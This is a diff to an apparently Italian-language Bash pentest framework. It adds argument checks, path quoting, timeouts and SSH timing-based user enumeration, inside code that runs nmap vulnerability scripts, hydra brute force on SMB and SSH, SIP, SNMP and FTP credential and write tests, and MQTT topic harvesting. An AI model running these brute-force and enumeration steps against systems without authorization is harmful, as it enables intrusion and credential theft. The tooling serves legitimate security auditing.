@@ -77,6 +77,8 @@ found() {
     fi
 }
 section(){ echo -e "\n${BOLD}${CYAN}━━ $* ━━${NC}"; [[ -n "$_log_file" ]] && echo "━━ $* ━━" >> "$_log_file" || true; }
+# _req_arg OPTION VALUE — verifica che VALUE non sia vuoto
+_req_arg() { [[ -z "${2:-}" ]] && { err "$1 richiede un argomento"; exit 1; } || true; }
 
 banner() {
     echo -e "${BOLD}${CYAN}"
@@ -1042,6 +1044,8 @@ CUSTOM_COMM=""
 NMAP_TIMING=""
 NMAP_RATE_FAST=3000
 NMAP_RATE_FULL=5000
+CURL_TIMEOUT=10
+CMD_TIMEOUT=8
 
 apply_stealth() {
     if [[ $STEALTH -eq 1 ]]; then
@@ -1110,7 +1114,6 @@ _suggest_attacks() {
                   suggestions+=("17|modbus|$target|Porta ICS/SCADA — audit Modbus/industrial protocol") ;;
             8000) suggestions+=("16|onvif|$target --port 8000|ONVIF/gSOAP esposto — brute force WS-Security, GetDeviceInfo") ;;
             1935) suggestions+=("19|rtmp|$target --port 1935|RTMP esposto — probe stream DVR/NVR/telecamere") ;;
-            44818) suggestions+=("16|enip|$target|EtherNet/IP (44818) — PLC/ICS Allen-Bradley, Rockwell") ;;
             5683) suggestions+=("23|coap|$target|CoAP esposto — dispositivo IoT, risorse pubbliche") ;;
             3702) suggestions+=("24|wsd|$target|WS-Discovery (3702) — device fingerprint telecamere/stampanti") ;;
             47808) suggestions+=("17|bacnet|$target|BACnet/IP (47808) — building automation, lettura oggetti") ;;
@@ -1178,11 +1181,11 @@ cmd_scan() {
     while [[ $# -gt 0 ]]; do
         case "$1" in
             --stealth)   STEALTH=1;        shift ;;
-            --udp-top)   udp_top="$2";     shift 2 ;;
+            --udp-top)   _req_arg "$1" "${2:-}"; udp_top="$2";     shift 2 ;;
             --no-full)   do_full=0;        shift ;;
             --vuln)      do_vuln=1;        shift ;;
-            --timeout)   TIMEOUT="$2"; validate_timeout "$2"; shift 2 ;;
-            --output)    OUTDIR_BASE="$2"; shift 2 ;;
+            --timeout)   _req_arg "$1" "${2:-}"; TIMEOUT="$2"; validate_timeout "$2"; shift 2 ;;
+            --output)    _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
             --dry-run)   DRY_RUN=1;        shift ;;
             --help|-h)   usage_scan; exit 0 ;;
             -*)          err "Opzione sconosciuta: $1"; usage_scan; exit 1 ;;
@@ -1200,25 +1203,25 @@ cmd_scan() {
     if require_tool arp-scan; then
         local iface; iface=$(ip route get "$target" 2>/dev/null | awk '/dev/{print $5; exit}' || echo eth0)
         run_cmd "arp_scan" \
-            "arp-scan -I ${iface} ${target}/32 2>/dev/null | tee "$OUTDIR"/arp.txt; echo '[DONE] arp-scan'"
+            "arp-scan -I ${iface} ${target}/32 2>/dev/null | tee \"$OUTDIR\"/arp.txt; echo '[DONE] arp-scan'"
     fi
 
     section "Nmap Fast (top 1000 + scripts)"
     run_cmd "nmap_fast" \
         "nmap -sV -sC -O --min-rate $NMAP_RATE_FAST $NMAP_TIMING \
-         -oA "$OUTDIR"/nmap_fast $target 2>&1 | tee "$OUTDIR"/nmap_fast.log"
+         -oA \"$OUTDIR\"/nmap_fast $target 2>&1 | tee \"$OUTDIR\"/nmap_fast.log"
 
     if [[ $do_full -eq 1 ]]; then
         section "Nmap Full (-p-)"
         run_cmd "nmap_full" \
             "nmap -sV -p- --min-rate $NMAP_RATE_FULL $NMAP_TIMING \
-             -oA "$OUTDIR"/nmap_full $target 2>&1 | tee "$OUTDIR"/nmap_full.log"
+             -oA \"$OUTDIR\"/nmap_full $target 2>&1 | tee \"$OUTDIR\"/nmap_full.log"
     fi
 
     section "Nmap UDP top $udp_top"
     run_cmd "nmap_udp" \
         "nmap -sU --top-ports $udp_top $NMAP_TIMING \
-         -oA "$OUTDIR"/nmap_udp $target 2>&1 | tee "$OUTDIR"/nmap_udp.log"
+         -oA \"$OUTDIR\"/nmap_udp $target 2>&1 | tee \"$OUTDIR\"/nmap_udp.log"
 
     section "Searchsploit (da nmap XML)"
     if require_tool searchsploit && [[ $DRY_RUN -eq 0 ]]; then
@@ -1288,12 +1291,12 @@ cmd_web() {
     local wordlist=""
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --port)      port="$2";        shift 2 ;;
-            --scheme)    scheme="$2";      shift 2 ;;
-            --wordlist)  wordlist="$2";    shift 2 ;;
-            --threads)   threads="$2";     shift 2 ;;
+            --port)      _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
+            --scheme)    _req_arg "$1" "${2:-}"; scheme="$2";      shift 2 ;;
+            --wordlist)  _req_arg "$1" "${2:-}"; wordlist="$2";    shift 2 ;;
+            --threads)   _req_arg "$1" "${2:-}"; threads="$2";     shift 2 ;;
             --fuzz)      do_fuzz=1;        shift ;;
-            --output)    OUTDIR_BASE="$2"; shift 2 ;;
+            --output)    _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
             --dry-run)   DRY_RUN=1;        shift ;;
             --help|-h)   usage_web; exit 0 ;;
             -*)          err "Opzione sconosciuta: $1"; usage_web; exit 1 ;;
@@ -1313,22 +1316,22 @@ cmd_web() {
 
     section "HTTP Headers + Redirect"
     run_cmd "headers" \
-        "curl -sv $insecure -L --max-time 10 -o /dev/null '${base_url}/' 2>&1 \
-         | tee "$OUTDIR"/headers.txt"
+        "curl -sv $insecure -L --max-time ${CURL_TIMEOUT:-10} -o /dev/null '${base_url}/' 2>&1 \
+         | tee \"$OUTDIR\"/headers.txt"
     run_cmd "sec_headers" \
-        "curl -sI $insecure --max-time 10 '${base_url}/' 2>&1 \
+        "curl -sI $insecure --max-time ${CURL_TIMEOUT:-10} '${base_url}/' 2>&1 \
          | grep -iE 'strict-transport|x-frame|x-xss|x-content-type|content-security|permissions-policy|referrer' \
-         | tee "$OUTDIR"/security_headers.txt"
+         | tee \"$OUTDIR\"/security_headers.txt"
 
     if [[ "$scheme" == "https" ]]; then
         section "SSL/TLS Analysis"
         run_cmd "ssl_nmap" \
             "nmap -p $port \
              --script ssl-cert,ssl-enum-ciphers,ssl-heartbleed,ssl-poodle,ssl-ccs-injection,ssl-dh-params \
-             -oN "$OUTDIR"/ssl_nmap.txt $target 2>&1"
+             -oN \"$OUTDIR\"/ssl_nmap.txt $target 2>&1"
         run_cmd "ssl_cert" \
             "echo | openssl s_client -connect '${target}:${port}' 2>/dev/null \
-             | openssl x509 -text -noout 2>/dev/null | tee "$OUTDIR"/cert.txt"
+             | openssl x509 -text -noout 2>/dev/null | tee \"$OUTDIR\"/cert.txt"
     fi
 
     section "Web Vulnerability Scanner"
@@ -1356,7 +1359,7 @@ cmd_web() {
     if require_tool gobuster && [[ -n "$wl" ]]; then
         local gb_opts="dir -u $base_url -w $wl -t $threads -q"
         [[ "$scheme" == "https" ]] && gb_opts="$gb_opts -k"
-        run_cmd "gobuster" "gobuster $gb_opts 2>&1 | tee "$OUTDIR"/gobuster.txt"
+        run_cmd "gobuster" "gobuster $gb_opts 2>&1 | tee \"$OUTDIR\"/gobuster.txt"
     elif [[ -z "$wl" ]]; then
         warn "Wordlist web non trovata — gobuster saltato"
     fi
@@ -1365,24 +1368,25 @@ cmd_web() {
     run_cmd "nmap_http" \
         "nmap -p $port \
          --script http-methods,http-auth-finder,http-stored-xss,http-dombased-xss,http-csrf,http-robots.txt \
-         -oN "$OUTDIR"/nmap_http.txt $target 2>&1"
+         -oN \"$OUTDIR\"/nmap_http.txt $target 2>&1"
 
     section "JS File Analysis (endpoint extraction)"
     if [[ $DRY_RUN -eq 0 ]]; then
         local js_files
-        js_files=$(curl -sk $insecure --max-time 10 "${base_url}/" 2>/dev/null \
+        js_files=$(curl -sk $insecure --max-time ${CURL_TIMEOUT:-10} "${base_url}/" 2>/dev/null \
                    | grep -oP 'src="[^"]+\.js[^"]*"' | sed 's/src="//;s/"//' || true)
         local js_count=0
-        for jsfile in $js_files; do
+        while IFS= read -r jsfile; do
+            [[ -z "$jsfile" ]] && continue
             local js_url="${base_url}/${jsfile#/}"
             local jsname; jsname=$(basename "$jsfile" | tr '/?&' '_')
-            curl -sk $insecure --max-time 10 "$js_url" -o "$OUTDIR/js_${jsname}" 2>/dev/null && {
+            curl -sk $insecure --max-time ${CURL_TIMEOUT:-10} "$js_url" -o "$OUTDIR/js_${jsname}" 2>/dev/null && {
                 grep -oP '(?:api|page|action|endpoint)["\s:=]+["'"'"'][^"'"'"'<>\s]{3,80}["'"'"']' \
                     "$OUTDIR/js_${jsname}" 2>/dev/null \
                     | sort -u >> "$OUTDIR/js_endpoints.txt" || true
                 ((js_count++))
             }
-        done
+        done <<< "$js_files"
         [[ $js_count -gt 0 ]] && log "Analizzati $js_count file JS"
     else
         echo -e "${CYAN}[DRY-RUN]${NC} JS analysis su ${base_url}/"
@@ -1577,10 +1581,10 @@ cmd_sip() {
     local target="" port=5060 ext_range="100-299" wordlist=""
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --port)      port="$2";        shift 2 ;;
-            --range)     ext_range="$2";   shift 2 ;;
-            --wordlist)  wordlist="$2";    shift 2 ;;
-            --output)    OUTDIR_BASE="$2"; shift 2 ;;
+            --port)      _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
+            --range)     _req_arg "$1" "${2:-}"; ext_range="$2";   shift 2 ;;
+            --wordlist)  _req_arg "$1" "${2:-}"; wordlist="$2";    shift 2 ;;
+            --output)    _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
             --dry-run)   DRY_RUN=1;        shift ;;
             --help|-h)   usage_sip; exit 0 ;;
             -*)          err "Opzione sconosciuta: $1"; usage_sip; exit 1 ;;
@@ -1597,14 +1601,14 @@ cmd_sip() {
     run_cmd "nmap_sip" \
         "nmap -p $port,5061 -sU -sS \
          --script sip-enum-users,sip-methods \
-         -oN "$OUTDIR"/nmap_sip.txt $target 2>&1"
+         -oN \"$OUTDIR\"/nmap_sip.txt $target 2>&1"
 
     section "SIP Fingerprinting (svmap)"
     local svmap_cmd=""
     if tool_ok svmap; then
-        svmap_cmd="svmap $target 2>&1 | tee "$OUTDIR"/svmap.txt"
+        svmap_cmd="svmap $target 2>&1 | tee \"$OUTDIR\"/svmap.txt"
     elif python3 -c "import sipvicious" 2>/dev/null; then
-        svmap_cmd="python3 -m sipvicious.svmap $target 2>&1 | tee "$OUTDIR"/svmap.txt"
+        svmap_cmd="python3 -m sipvicious.svmap $target 2>&1 | tee \"$OUTDIR\"/svmap.txt"
     fi
     if [[ -n "$svmap_cmd" ]]; then
         run_cmd "svmap" "$svmap_cmd"
@@ -1624,9 +1628,9 @@ cmd_sip() {
     section "Extension Enumeration svwar ($ext_range)"
     local svwar_cmd=""
     if tool_ok svwar; then
-        svwar_cmd="svwar -e${ext_range} $target 2>&1 | tee "$OUTDIR"/svwar.txt"
+        svwar_cmd="svwar -e${ext_range} $target 2>&1 | tee \"$OUTDIR\"/svwar.txt"
     elif python3 -c "import sipvicious" 2>/dev/null; then
-        svwar_cmd="python3 -m sipvicious.svwar -e${ext_range} $target 2>&1 | tee "$OUTDIR"/svwar.txt"
+        svwar_cmd="python3 -m sipvicious.svwar -e${ext_range} $target 2>&1 | tee \"$OUTDIR\"/svwar.txt"
     fi
     if [[ -n "$svwar_cmd" ]]; then
         run_cmd "svwar" "$svwar_cmd"
@@ -1650,12 +1654,12 @@ cmd_sip() {
             for ext in $found_exts; do
                 log "  Crack extension: $ext"
                 run_cmd "svcrack_$ext" \
-                    "$svcrack_bin -u $ext -d $wl $target 2>&1 | tee "$OUTDIR"/svcrack_${ext}.txt"
+                    "$svcrack_bin -u $ext -d $wl $target 2>&1 | tee \"$OUTDIR\"/svcrack_${ext}.txt"
             done
         elif [[ -n "$svcrack_bin" ]]; then
             warn "Nessuna extension trovata — test su utente 'admin' con wordlist"
             run_cmd "svcrack_admin" \
-                "$svcrack_bin -u admin -d $wl $target 2>&1 | tee "$OUTDIR"/svcrack_admin.txt"
+                "$svcrack_bin -u admin -d $wl $target 2>&1 | tee \"$OUTDIR\"/svcrack_admin.txt"
         fi
     elif [[ $DRY_RUN -eq 1 ]]; then
         echo -e "${CYAN}[DRY-RUN]${NC} svcrack -u <ext> -d $wl $target"
@@ -1762,10 +1766,10 @@ cmd_smb() {
     while [[ $# -gt 0 ]]; do
         case "$1" in
             --no-bruteforce) do_brute=0;          shift ;;
-            --threads)       threads="$2";        shift 2 ;;
-            --userlist)      CUSTOM_USERS="$2";   shift 2 ;;
-            --passlist)      CUSTOM_PASS="$2";    shift 2 ;;
-            --output)        OUTDIR_BASE="$2";    shift 2 ;;
+            --threads)       _req_arg "$1" "${2:-}"; threads="$2";        shift 2 ;;
+            --userlist)      _req_arg "$1" "${2:-}"; CUSTOM_USERS="$2";   shift 2 ;;
+            --passlist)      _req_arg "$1" "${2:-}"; CUSTOM_PASS="$2";    shift 2 ;;
+            --output)        _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2";    shift 2 ;;
             --dry-run)       DRY_RUN=1;           shift ;;
             --help|-h)       usage_smb; exit 0 ;;
             -*)              err "Opzione sconosciuta: $1"; usage_smb; exit 1 ;;
@@ -1781,19 +1785,19 @@ cmd_smb() {
     run_cmd "nmap_smb" \
         "nmap -p 139,445 \
          --script smb-vuln*,smb-enum-users,smb-enum-shares,smb-os-discovery,smb-security-mode \
-         -oN "$OUTDIR"/nmap_smb.txt $target 2>&1"
+         -oN \"$OUTDIR\"/nmap_smb.txt $target 2>&1"
 
     section "NBTStat Info"
-    run_cmd "nbtstat" "nmap -p 137 --script nbstat $target -oN "$OUTDIR"/nbtstat.txt 2>&1"
+    run_cmd "nbtstat" "nmap -p 137 --script nbstat $target -oN \"$OUTDIR\"/nbtstat.txt 2>&1"
 
     section "enum4linux"
     if require_tool enum4linux; then
-        run_cmd "enum4linux" "enum4linux -a $target 2>&1 | tee "$OUTDIR"/enum4linux.txt"
+        run_cmd "enum4linux" "enum4linux -a $target 2>&1 | tee \"$OUTDIR\"/enum4linux.txt"
     fi
 
     section "Null Session (smbclient)"
     if require_tool smbclient; then
-        run_cmd "smb_null" "smbclient -L '//$target' -N 2>&1 | tee "$OUTDIR"/smb_null.txt"
+        run_cmd "smb_null" "smbclient -L '//$target' -N 2>&1 | tee \"$OUTDIR\"/smb_null.txt"
     fi
 
     section "EternalBlue MS17-010 + SMBGhost CVE-2020-0796"
@@ -1842,7 +1846,7 @@ cmd_smb() {
             local pl; pl=$(_wl_pass)
             run_cmd "hydra_smb" \
                 "hydra -L $ul -P $pl -t $threads -f \
-                 -o "$OUTDIR"/hydra_smb.txt $target smb 2>&1 | tee -a "$OUTDIR"/smb_audit.log"
+                 -o \"$OUTDIR\"/hydra_smb.txt $target smb 2>&1 | tee -a \"$OUTDIR\"/smb_audit.log"
             if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/hydra_smb.txt" ]]; then
                 grep -i "login:" "$OUTDIR/hydra_smb.txt" 2>/dev/null \
                     | while IFS= read -r line; do found HIGH "SMB — $line"; done || true
@@ -1878,12 +1882,12 @@ cmd_creds() {
     local target="" service="" port="" path="/" threads=4
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --port)      port="$2";        shift 2 ;;
-            --path)      path="$2";        shift 2 ;;
-            --userlist)  CUSTOM_USERS="$2"; shift 2 ;;
-            --passlist)  CUSTOM_PASS="$2"; shift 2 ;;
-            --threads)   threads="$2";     shift 2 ;;
-            --output)    OUTDIR_BASE="$2"; shift 2 ;;
+            --port)      _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
+            --path)      _req_arg "$1" "${2:-}"; path="$2";        shift 2 ;;
+            --userlist)  _req_arg "$1" "${2:-}"; CUSTOM_USERS="$2"; shift 2 ;;
+            --passlist)  _req_arg "$1" "${2:-}"; CUSTOM_PASS="$2"; shift 2 ;;
+            --threads)   _req_arg "$1" "${2:-}"; threads="$2";     shift 2 ;;
+            --output)    _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
             --dry-run)   DRY_RUN=1;        shift ;;
             --help|-h)   usage_creds; exit 0 ;;
             -*)          err "Opzione sconosciuta: $1"; usage_creds; exit 1 ;;
@@ -2010,9 +2014,9 @@ cmd_snmp() {
     local target="" communities_file="" snmp_ver=""
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --communities)  communities_file="$2"; shift 2 ;;
-            --version)      snmp_ver="$2";         shift 2 ;;
-            --output)       OUTDIR_BASE="$2";      shift 2 ;;
+            --communities)  _req_arg "$1" "${2:-}"; communities_file="$2"; shift 2 ;;
+            --version)      _req_arg "$1" "${2:-}"; snmp_ver="$2";         shift 2 ;;
+            --output)       _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2";      shift 2 ;;
             --dry-run)      DRY_RUN=1;             shift ;;
             --help|-h)      usage_snmp; exit 0 ;;
             -*)             err "Opzione sconosciuta: $1"; usage_snmp; exit 1 ;;
@@ -2028,7 +2032,7 @@ cmd_snmp() {
     run_cmd "nmap_snmp" \
         "nmap -sU -p 161,162 \
          --script snmp-info,snmp-sysdescr,snmp-brute \
-         -oN "$OUTDIR"/nmap_snmp.txt $target 2>&1"
+         -oN \"$OUTDIR\"/nmap_snmp.txt $target 2>&1"
 
     section "Community String Brute Force"
     local cfile
@@ -2091,7 +2095,8 @@ cmd_snmp() {
                 # Ricerca credenziali in processi/parametri
                 grep -iE "pass|password|key|secret|token" \
                     "$OUTDIR/snmp_processes.txt" "$OUTDIR/snmp_sw_params.txt" 2>/dev/null | \
-                    while IFS= read -r line; do found HIGH "SNMP — possibile credenziale in OID: $line"; done || true
+                    while IFS= read -r line; do found HIGH "SNMP — possibile credenziale in OID: $line"; done \
+                    || warn "SNMP grep credenziali: nessun match o file non disponibile"
 
                 section "SNMP Write Community Test (sysName.0)"
                 if tool_ok snmpset; then
@@ -2163,12 +2168,12 @@ cmd_ftp() {
     local target="" port=21 do_brute=1 threads=4
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --port)          port="$2";           shift 2 ;;
+            --port)          _req_arg "$1" "${2:-}"; port="$2";           shift 2 ;;
             --no-bruteforce) do_brute=0;          shift ;;
-            --threads)       threads="$2";        shift 2 ;;
-            --userlist)      CUSTOM_USERS="$2";   shift 2 ;;
-            --passlist)      CUSTOM_PASS="$2";    shift 2 ;;
-            --output)        OUTDIR_BASE="$2";    shift 2 ;;
+            --threads)       _req_arg "$1" "${2:-}"; threads="$2";        shift 2 ;;
+            --userlist)      _req_arg "$1" "${2:-}"; CUSTOM_USERS="$2";   shift 2 ;;
+            --passlist)      _req_arg "$1" "${2:-}"; CUSTOM_PASS="$2";    shift 2 ;;
+            --output)        _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2";    shift 2 ;;
             --dry-run)       DRY_RUN=1;           shift ;;
             --help|-h)       usage_ftp; exit 0 ;;
             -*)              err "Opzione sconosciuta: $1"; usage_ftp; exit 1 ;;
@@ -2184,7 +2189,7 @@ cmd_ftp() {
     run_cmd "nmap_ftp" \
         "nmap -p 21,2121 \
          --script ftp-anon,ftp-bounce,ftp-syst,ftp-proftpd-backdoor,ftp-vsftpd-backdoor \
-         -oN "$OUTDIR"/nmap_ftp.txt $target 2>&1"
+         -oN \"$OUTDIR\"/nmap_ftp.txt $target 2>&1"
     if [[ $DRY_RUN -eq 0 ]] && grep -q "Anonymous FTP login allowed" "$OUTDIR/nmap_ftp.txt" 2>/dev/null; then
         found HIGH "FTP:21 — accesso anonimo consentito"
     fi
@@ -2196,7 +2201,7 @@ cmd_ftp() {
             local banner; banner=$(nc -w 3 "$target" "$p" </dev/null 2>&1 | head -3)
             [[ -n "$banner" ]] && echo "FTP:${p} | $banner" | tee -a "$OUTDIR/ftp_banner.txt"
             local anon
-            anon=$(curl -s --max-time 10 "ftp://${target}:${p}/" \
+            anon=$(curl -s --max-time ${CURL_TIMEOUT:-10} "ftp://${target}:${p}/" \
                    --user "anonymous:pentest@scan.local" 2>&1 | head -20)
             if [[ -n "$anon" ]] && ! echo "$anon" | grep -qiE "530|Login.*failed|denied|refused"; then
                 found HIGH "FTP:${p} — accesso anonimo riuscito"
@@ -2213,7 +2218,7 @@ cmd_ftp() {
             check_port "$target" "$p" || continue
             # Prova STOR come anonimo
             local stor_resp
-            stor_resp=$(curl -s --max-time 10 \
+            stor_resp=$(curl -s --max-time ${CURL_TIMEOUT:-10} \
                 "ftp://${target}:${p}/.exa_write_test" \
                 --user "anonymous:pentest@test.local" \
                 --upload-file /dev/null 2>&1 || true)
@@ -2297,12 +2302,12 @@ cmd_ssh() {
     local target="" port=22 do_brute=1 threads=4
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --port)          port="$2";           shift 2 ;;
+            --port)          _req_arg "$1" "${2:-}"; port="$2";           shift 2 ;;
             --no-bruteforce) do_brute=0;          shift ;;
-            --userlist)      CUSTOM_USERS="$2";   shift 2 ;;
-            --passlist)      CUSTOM_PASS="$2";    shift 2 ;;
-            --threads)       threads="$2";        shift 2 ;;
-            --output)        OUTDIR_BASE="$2";    shift 2 ;;
+            --userlist)      _req_arg "$1" "${2:-}"; CUSTOM_USERS="$2";   shift 2 ;;
+            --passlist)      _req_arg "$1" "${2:-}"; CUSTOM_PASS="$2";    shift 2 ;;
+            --threads)       _req_arg "$1" "${2:-}"; threads="$2";        shift 2 ;;
+            --output)        _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2";    shift 2 ;;
             --dry-run)       DRY_RUN=1;           shift ;;
             --help|-h)       usage_ssh; exit 0 ;;
             -*)              err "Opzione sconosciuta: $1"; usage_ssh; exit 1 ;;
@@ -2318,11 +2323,11 @@ cmd_ssh() {
     run_cmd "nmap_ssh" \
         "nmap -p $port \
          --script ssh-hostkey,ssh-auth-methods,ssh2-enum-algos \
-         -oN "$OUTDIR"/nmap_ssh.txt $target 2>&1"
+         -oN \"$OUTDIR\"/nmap_ssh.txt $target 2>&1"
 
     section "SSH-Audit (algoritmi e vulnerabilità)"
     if tool_ok ssh-audit; then
-        run_cmd "ssh_audit" "ssh-audit -p $port $target 2>&1 | tee "$OUTDIR"/ssh_audit.txt"
+        run_cmd "ssh_audit" "ssh-audit -p $port $target 2>&1 | tee \"$OUTDIR\"/ssh_audit.txt"
     else
         warn "ssh-audit non trovato (apt install ssh-audit) — step saltato"
     fi
@@ -2367,8 +2372,20 @@ cmd_ssh() {
                 echo "User $u: ${elapsed}ms" >> "$OUTDIR/ssh_user_timing.txt"
             done
             log "Timing results: ${timing_results[*]}"
-            # Differenza > 500ms tra utenti validi e invalidi indica enum
-            found INFO "SSH:$port — timing analysis completata (vedi ssh_user_timing.txt)"
+            # Calcola la differenza max tra i tempi di risposta
+            local max_t=0 min_t=999999 max_diff=0
+            for tr in "${timing_results[@]}"; do
+                local t_val; t_val="${tr##*:}"; t_val="${t_val%ms}"
+                [[ "$t_val" -gt "$max_t" ]] && max_t="$t_val"
+                [[ "$t_val" -lt "$min_t" ]] && min_t="$t_val"
+            done
+            max_diff=$(( max_t - min_t ))
+            echo "Max diff: ${max_diff}ms" >> "$OUTDIR/ssh_user_timing.txt"
+            if [[ "$max_diff" -gt 200 ]]; then
+                found MEDIUM "SSH:$port — possibile user enumeration via timing (diff: ${max_diff}ms)"
+            else
+                log "SSH timing: nessuna differenza significativa rilevata (diff: ${max_diff}ms)"
+            fi
         fi
     else
         echo -e "${CYAN}[DRY-RUN]${NC} SSH user enumeration timing su $target:$port"
@@ -2380,7 +2397,7 @@ cmd_ssh() {
             local ul; ul=$(_wl_users); local pl; pl=$(_wl_pass)
             run_cmd "hydra_ssh" \
                 "hydra -L $ul -P $pl -s $port -t $threads -f \
-                 -o "$OUTDIR"/hydra_ssh.txt $target ssh 2>&1"
+                 -o \"$OUTDIR\"/hydra_ssh.txt $target ssh 2>&1"
             if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/hydra_ssh.txt" ]]; then
                 grep -i "login:" "$OUTDIR/hydra_ssh.txt" 2>/dev/null \
                     | while IFS= read -r line; do found HIGH "SSH:${port} — $line"; done || true
@@ -2414,12 +2431,12 @@ cmd_telnet() {
     local target="" ports_str="23,2323" do_brute=1 threads=4
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --ports)         ports_str="$2";      shift 2 ;;
+            --ports)         _req_arg "$1" "${2:-}"; ports_str="$2";      shift 2 ;;
             --no-bruteforce) do_brute=0;          shift ;;
-            --userlist)      CUSTOM_USERS="$2";   shift 2 ;;
-            --passlist)      CUSTOM_PASS="$2";    shift 2 ;;
-            --threads)       threads="$2";        shift 2 ;;
-            --output)        OUTDIR_BASE="$2";    shift 2 ;;
+            --userlist)      _req_arg "$1" "${2:-}"; CUSTOM_USERS="$2";   shift 2 ;;
+            --passlist)      _req_arg "$1" "${2:-}"; CUSTOM_PASS="$2";    shift 2 ;;
+            --threads)       _req_arg "$1" "${2:-}"; threads="$2";        shift 2 ;;
+            --output)        _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2";    shift 2 ;;
             --dry-run)       DRY_RUN=1;           shift ;;
             --help|-h)       usage_telnet; exit 0 ;;
             -*)              err "Opzione sconosciuta: $1"; usage_telnet; exit 1 ;;
@@ -2487,9 +2504,9 @@ cmd_mqtt() {
     local target="" port=1883 topics_file=""
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --port)      port="$2";        shift 2 ;;
-            --topics)    topics_file="$2"; shift 2 ;;
-            --output)    OUTDIR_BASE="$2"; shift 2 ;;
+            --port)      _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
+            --topics)    _req_arg "$1" "${2:-}"; topics_file="$2"; shift 2 ;;
+            --output)    _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
             --dry-run)   DRY_RUN=1;        shift ;;
             --help|-h)   usage_mqtt; exit 0 ;;
             -*)          err "Opzione sconosciuta: $1"; usage_mqtt; exit 1 ;;
@@ -2504,7 +2521,7 @@ cmd_mqtt() {
     section "Nmap MQTT Scan (1883, 8883)"
     run_cmd "nmap_mqtt" \
         "nmap -p 1883,8883 --script mqtt-subscribe \
-         -oN "$OUTDIR"/nmap_mqtt.txt $target 2>&1"
+         -oN \"$OUTDIR\"/nmap_mqtt.txt $target 2>&1"
 
     if ! tool_ok mosquitto_sub; then
         warn "mosquitto_sub non trovato (apt install mosquitto-clients) — test broker saltato"
@@ -2517,7 +2534,7 @@ cmd_mqtt() {
         local extra=""; [[ $p -eq 8883 ]] && extra="--insecure"
         run_cmd "mqtt_anon_$p" \
             "timeout 5 mosquitto_sub -h $target -p $p -t '#' $extra -v 2>&1 \
-             | head -30 | tee "$OUTDIR"/mqtt_anon_${p}.txt"
+             | head -30 | tee \"$OUTDIR\"/mqtt_anon_${p}.txt"
         if [[ $DRY_RUN -eq 0 && -s "$OUTDIR/mqtt_anon_${p}.txt" ]]; then
             if ! grep -qiE "error|refused|not authorized|Connection Refused" "$OUTDIR/mqtt_anon_${p}.txt"; then
                 found HIGH "MQTT:${p} — broker accessibile in modo anonimo"
@@ -2573,7 +2590,7 @@ cmd_mqtt() {
     section "MQTT Retained Messages (credenziali/config)"
     if [[ $DRY_RUN -eq 0 ]] && tool_ok mosquitto_sub; then
         local retained
-        retained=$(timeout 8 mosquitto_sub -h "$target" -p "$port" \
+        retained=$(timeout ${CMD_TIMEOUT:-8} mosquitto_sub -h "$target" -p "$port" \
             -t '#' -v --retained-only 2>/dev/null | head -30 || true)
         if [[ -n "$retained" ]]; then
             echo "$retained" > "$OUTDIR/mqtt_retained.txt"
@@ -2627,8 +2644,8 @@ cmd_modbus() {
     local target="" port=502
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --port)    port="$2";        shift 2 ;;
-            --output)  OUTDIR_BASE="$2"; shift 2 ;;
+            --port)    _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
+            --output)  _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
             --dry-run) DRY_RUN=1;        shift ;;
             --help|-h) usage_modbus; exit 0 ;;
             -*)        err "Opzione sconosciuta: $1"; usage_modbus; exit 1 ;;
@@ -2644,10 +2661,10 @@ cmd_modbus() {
     run_cmd "nmap_ics_tcp" \
         "nmap -p 502,44818,2404,102 \
          --script modbus-discover,enip-info \
-         -oN "$OUTDIR"/nmap_ics_tcp.txt $target 2>&1"
+         -oN \"$OUTDIR\"/nmap_ics_tcp.txt $target 2>&1"
     run_cmd "nmap_bacnet" \
         "nmap -sU -p 47808 --script bacnet-info \
-         -oN "$OUTDIR"/nmap_bacnet.txt $target 2>&1"
+         -oN \"$OUTDIR\"/nmap_bacnet.txt $target 2>&1"
 
     if [[ $DRY_RUN -eq 0 ]]; then
         grep -q "^502/tcp.*open"   "$OUTDIR/nmap_ics_tcp.txt" 2>/dev/null && \
@@ -2742,7 +2759,7 @@ cmd_upnp() {
     local target=""
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --output)  OUTDIR_BASE="$2"; shift 2 ;;
+            --output)  _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
             --dry-run) DRY_RUN=1;        shift ;;
             --help|-h) usage_upnp; exit 0 ;;
             -*)        err "Opzione sconosciuta: $1"; usage_upnp; exit 1 ;;
@@ -2757,7 +2774,7 @@ cmd_upnp() {
     section "Nmap UPnP Scan (TCP 2869, UDP 1900)"
     run_cmd "nmap_upnp" \
         "nmap -p 2869,1900 --script upnp-info \
-         -oN "$OUTDIR"/nmap_upnp.txt $target 2>&1"
+         -oN \"$OUTDIR\"/nmap_upnp.txt $target 2>&1"
 
     section "SSDP M-SEARCH Discovery"
     if [[ $DRY_RUN -eq 0 ]]; then
@@ -2793,7 +2810,7 @@ cmd_upnp() {
